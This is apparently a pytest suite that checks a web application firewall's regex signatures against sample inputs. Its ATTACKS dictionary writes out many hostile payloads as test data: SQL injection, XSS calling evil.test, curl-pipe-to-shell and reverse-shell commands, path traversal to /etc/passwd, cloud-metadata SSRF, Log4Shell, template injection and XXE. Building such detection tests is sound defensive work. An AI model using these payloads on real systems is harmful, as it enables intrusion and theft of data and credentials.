"""Regex pre-filter (SIGNATURES in waf_rules.lua), run with OpenResty's own PCRE.

The signatures are cut from the Lua file between "-- signatures:begin" and
"-- signatures:end", so the tests always exercise the deployed patterns. They
run with `resty` in the OpenResty -alpine-fat image of the same version as
Dockerfile.openresty (the plain image lacks Perl, which resty needs).
"""

import json
import re
import shutil
import subprocess
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
LUA = (ROOT / "waf_rules.lua").read_text(encoding="utf-8")
VERSION = re.search(r"ARG OPENRESTY_VERSION=(\S+)", (ROOT / "Dockerfile.openresty").read_text()).group(1)
IMAGE = f"openresty/openresty:{VERSION}-alpine-fat"

ATTACKS = {
    "1 UNION SELECT username, password FROM users": "union_select",
    "1 union/**/all/**/select 1,2": "union_select",
    "-1 UNION(SELECT 1)": "union_select",
    "x; DROP TABLE users": "stacked_query",
    "1; exec master..xp_dirtree '//x'": "stacked_query",
    "'; EXEC xp_cmdshell('dir')--": "dangerous_procedure",
    "1 WAITFOR DELAY '0:0:5'": "time_delay",
    "1 AND SLEEP(5)": "time_delay",
    "1' and benchmark(5000000,md5(1))--": "time_delay",
    "' or '1'='1": "tautology",
    "') OR ('a'='a": "tautology",
    "'/**/or/**/1=1": "tautology",
    "1 OR 1=1": "numeric_tautology",
    "1 AND (SELECT substring(password,1,1) FROM users WHERE id=1)='a'": "boolean_subquery",
    "1 AND 1=(SELECT COUNT(*) FROM users)": "boolean_subquery",
    "1 or (select length(database()))>5": "boolean_subquery",
    "1 AND ASCII(SUBSTRING((SELECT password FROM users),1,1))>77": "blind_extraction",
    "1 AND ASCII(SUBSTR((SELECT pw FROM u LIMIT 1),1,1))=97": "blind_extraction",
    "1 AND ORD(MID((SELECT email FROM members),1,1))>64": "blind_extraction",
    "1' AND IF((SELECT SUBSTRING(pw,1,1) FROM u)='a',SLEEP(3),0)--": "blind_extraction",
    "x AND LENGTH((SELECT secret FROM accounts LIMIT 1))>10": "blind_extraction",
    # good-word padding must not hide the blind-extraction signature
    "great product fast shipping " * 20 + " AND ASCII(SUBSTRING((SELECT pw FROM u),1,1))>77": "blind_extraction",
    "admin'--": "quote_comment",
    "admin' #": "quote_comment",
    "/*!50000union*/": "mysql_versioned_comment",
    "1 or/**/1": "comment_obfuscation",
    "select table_name from information_schema.tables": "system_catalog",
    "1 and @@version": "system_catalog",
    "1 into outfile '/var/www/x.php'": "file_access",
    "load_file('/etc/passwd')": "file_access",
    "extractvalue(1,concat(0x7e,version()))": "error_based",
    "char(115)||char(113)": "char_concat",
    # good-word padding does not hide a signature
    "' or 'a'='a " + "great product, fast shipping, would buy again " * 40: "tautology",
    # XSS
    "<script>alert(1)</script>": "xss_script_tag",
    "</ScRiPt><script src=//evil.test/x.js>": "xss_script_tag",
    "<iframe src=//evil.test>": "xss_script_tag",
    "<img src=x onerror=alert(1)>": "xss_event_handler",
    '" onmouseover="alert(document.cookie)': "xss_event_handler",
    "<svg/onload=fetch('//evil.test')>": "xss_event_handler",
    "javascript:alert(document.domain)": "xss_script_uri",
    "JaVaScRiPt://%0aalert(1)": "xss_script_uri",
    "data:text/html;base64,PHNjcmlwdD4=": "xss_script_uri",
    "x=document.cookie": "xss_dom_sink",
    "eval('al'+'ert(1)')": "xss_dom_sink",
    "String.fromCharCode(88,83,83)": "xss_dom_sink",
    "alert`1`": "xss_dom_sink",
    # command injection
    "127.0.0.1; whoami": "cmd_chain",
    "x | cat /etc/passwd": "cmd_chain",
    "a && curl http://evil.test/s.sh | sh": "cmd_chain",
    "$(id)": "cmd_chain",
    "`uname -a`": "cmd_chain",
    "1; sleep 10": "cmd_chain",
    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1": "cmd_reverse_shell",
    "nc 10.0.0.1 4444 -e /bin/sh": "cmd_reverse_shell",
    "powershell -enc SQBFAFgA": "cmd_reverse_shell",
    # path traversal / file inclusion
    "../../../../etc/passwd": "path_traversal",
    "..%2f..%2f..%2fetc%2fpasswd": "path_traversal",
    r"..\..\windows\win.ini": "path_traversal",
    "../config.php": "path_traversal",
    "/var/www/../../etc/shadow": "path_traversal",
    "/etc/passwd": "sensitive_file",
    "/proc/self/environ": "sensitive_file",
    "/.env": "sensitive_file",
    "/.git/config": "sensitive_file",
    "/app/.env.production": "sensitive_file",
    r"C:\Windows\System32\drivers": "sensitive_file",
    "php://filter/convert.base64-encode/resource=index.php": "file_wrapper",
    "file:///etc/hostname": "file_wrapper",
    # SSRF
    "http://169.254.169.254/latest/meta-data/iam/": "ssrf_metadata",
    "http://metadata.google.internal/computeMetadata/v1/": "ssrf_metadata",
    "gopher://127.0.0.1:6379/_FLUSHALL": "ssrf_scheme",
    "http://2130706433/admin": "ssrf_scheme",
    "http://0x7f000001/": "ssrf_scheme",
    "http://0177.0.0.1/": "ssrf_scheme",
    # known-vulnerable components
    "${jndi:ldap://evil.test/a}": "log4shell",
    "${${lower:j}ndi:${lower:l}dap://evil.test/a}": "log4shell",
    "${${::-j}${::-n}${::-d}${::-i}:rmi://evil.test/a}": "log4shell",
    "() { :; }; /bin/bash -c 'id'": "shellshock",
    "%{(#_memberAccess['allowStaticMethodAccess']=true)}": "ognl_injection",
    "class.module.classLoader.resources.context.parent.pipeline.first.pattern": "ognl_injection",
    "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ": "java_deserialization",
    # template injection
    "{{7*7}}": "ssti_probe",
    "${7*7}": "ssti_probe",
    "<%= 7 * 7 %>": "ssti_probe",
    "{{''.__class__.__mro__[1].__subclasses__()}}": "ssti_object_access",
    "{{ config.items() }}": "ssti_object_access",
    "{{ lipsum.__globals__['os'].popen('id').read() }}": "ssti_object_access",
    # XXE
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>': "xxe_entity",
    '<!ENTITY % remote SYSTEM "http://evil.test/x.dtd">': "xxe_entity",
    # NoSQL (JSON keys and parameter names)
    "$ne": "nosql_operator",
    "$where": "nosql_operator",
    "username[$ne]": "nosql_operator",
    "password[$regex]": "nosql_operator",
    # CRLF
    "x\r\nSet-Cookie: session=evil": "crlf_injection",
    "/home\r\nLocation: https://evil.test": "crlf_injection",
    "a\r\n\r\nHTTP/1.1 200 OK": "crlf_injection",
    # scanners
    "sqlmap/1.8.2#stable (https://sqlmap.org)": "scanner",
    "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:007002)": "scanner",
    "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)": "scanner",
    "Fuzz Faster U Fool v2.1.0": "scanner",
}

BENIGN = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0In0.ab--cd_EF-gh",
    "https://example.com/search?q=or+and&sort=desc&page=2",
    "O'Brien", "Rock 'n' roll", "it's a select few", "union station", "order by price",
    "--verbose", "/* see notes */", "I need sleep (8 hours)", "drop table tennis; exec summary",
    "1=1 is true", "SELECT your size", "Tom & Jerry", "50% off -- today only",
    # look-alikes for the non-SQLi signatures
    "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "curl/8.21.0", "python-requests/2.32.3",
    "http://localhost:8080/fr", "http://127.0.0.1:8081/", "https://shop.example.com/cart?id=5&sort=price",
    "<b>bold</b> and <i>italic</i>", '<img src="cat.png" alt="a cat">', '<a href="/help">help</a>',
    "JavaScript: The Good Parts", "online", "onboarding = done", "turn on click tracking",
    "Q&A | FAQ", "rock & roll", "fish & chips; ice cream", "salt & pepper | sides", "a <= b && c >= d",
    "cell nuclei", "nikto is a scanner", "price $100", "$5 off", "50 * 2 = 100",
    "https://cdn.example.com/a/b/../c.js", "wait.../what", "/.github/workflows/ci.yml", "/.well-known/security.txt",
    r"C:\Users\me\Documents\report.docx", "{{ name }}", "Hello {{ user.first_name }}",
    "<!DOCTYPE html>",
    '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
    "Line one\r\nLine two", "Meet me at the location: Paris", "user@example.com",
    "I need to confirm (the order)", "set an alert for 5pm", "${price}", "the env: production",
    "dGhpcyBpcyBub3QgcjBPMEFCIGF0IGFsbA", "100.100.100.2", "ldap server settings",
    "CREATE TABLE `logs` (`id` int(6) unsigned)",
    "Sizes S, M and (select one from the list)", "salt and (select a brand) pepper",
    # blind_extraction look-alikes: SQL-ish function words without a nested subquery
    "count the items in your cart", "the left side of the page", "right and left shoes",
    "please select your size from the menu", "concat your first and last name",
    "length and width in cm", "lower or upper case letters", "cast your vote now",
    # the smoke test's ML-only attack must match no signature (ML scores it)
    "7 AND UNICODE(SUBSTRING(username,1,1))>100",
]

# Inputs built to make backtracking regexes blow up; must stay linear.
REDOS = {
    "quote_spaces": "'" + " " * 100_000 + "x",
    "open_comments": "/*" * 50_000,
    "comment_chain": "union" + "/**/" * 30_000 + "x",
    "repeated_tautology": "'or'a'='" * 10_000,
    "spaces_then_eq": "or 1" + " " * 100_000 + "=",
    "open_tags": "<a " * 30_000,
    "event_prefix": " on" * 30_000,
    "dollar_braces": "${" * 50_000,
    "template_braces": "{{" * 50_000 + "7*",
    "dot_dot": "..%2" * 30_000,
    "shell_separators": ";" * 50_000 + "x",
    "nc_no_flag": "nc " + "a " * 50_000,
    "quote_after_alert": "alert('" + "x" * 100_000,
    "entity_padding": "<!ENTITY " + "a" * 100_000,
}

needs_docker = pytest.mark.skipif(shutil.which("docker") is None, reason="Docker not installed")


def _signature_block() -> str:
    match = re.search(r"-- signatures:begin\n(.*?)\n-- signatures:end", LUA.replace("\r\n", "\n"), re.S)
    assert match, "signature markers missing from waf_rules.lua"
    return match.group(1)


RUNNER = r"""
local cjson = require "cjson"
%s
local parts = {}
for i, s in ipairs(SIGNATURES) do parts[i] = "(?:" .. s.pattern .. ")" end
local combined = table.concat(parts, "|")
local input = cjson.decode([==[%s]==])
local result = { matches = {}, combined = {}, timings = {} }
for i, value in ipairs(input.values) do
  local ids = {}
  for _, s in ipairs(SIGNATURES) do
    local from, _, err = ngx.re.find(value, s.pattern, "joi")
    if err then error(s.id .. ": " .. err) end
    if from then ids[#ids + 1] = s.id end
  end
  result.matches[i] = ids
  result.combined[i] = ngx.re.find(value, combined, "joi") ~= nil
end
for name, value in pairs(input.redos) do
  ngx.update_time()
  local started = ngx.now()
  local _, _, err = ngx.re.find(value, combined, "joi")
  ngx.update_time()
  result.timings[name] = { ms = (ngx.now() - started) * 1000, err = err }
end
print(cjson.encode(result))
"""


@pytest.fixture(scope="module")
def results() -> dict:
    values = list(ATTACKS) + BENIGN
    script = RUNNER % (_signature_block(), json.dumps({"values": values, "redos": REDOS}))
    try:
        done = subprocess.run(
            ["docker", "run", "--rm", "-i", "--entrypoint", "sh", IMAGE, "-c", "cat > /tmp/t.lua && resty /tmp/t.lua"],
            input=script, capture_output=True, text=True, encoding="utf-8", timeout=300,
        )
    except (OSError, subprocess.TimeoutExpired) as exc:
        pytest.skip(f"Docker unavailable: {exc}")
    if done.returncode != 0:
        if "Cannot connect to the Docker daemon" in done.stderr or "error during connect" in done.stderr:
            pytest.skip("Docker daemon not running")
        pytest.fail(f"resty failed:\n{done.stderr}")
    output = json.loads(done.stdout)
    return {
        "matches": dict(zip(values, (m or [] for m in output["matches"]))),
        "combined": dict(zip(values, output["combined"])),
        "timings": output["timings"],
    }


@needs_docker
@pytest.mark.docker
@pytest.mark.parametrize("value,signature", ATTACKS.items(), ids=[s for s in ATTACKS.values()])
def test_attack_matches_expected_signature(results: dict, value: str, signature: str) -> None:
    assert signature in results["matches"][value]
    assert results["combined"][value]


@needs_docker
@pytest.mark.docker
@pytest.mark.parametrize("value", BENIGN)
def test_benign_value_matches_nothing(results: dict, value: str) -> None:
    assert results["matches"][value] == []
    assert not results["combined"][value]


@needs_docker
@pytest.mark.docker
@pytest.mark.parametrize("name", REDOS)
def test_no_catastrophic_backtracking(results: dict, name: str) -> None:
    timing = results["timings"][name]
    assert not timing.get("err")  # e.g. the PCRE match limit
    assert timing["ms"] < 250, f"{name}: {timing['ms']:.1f} ms"
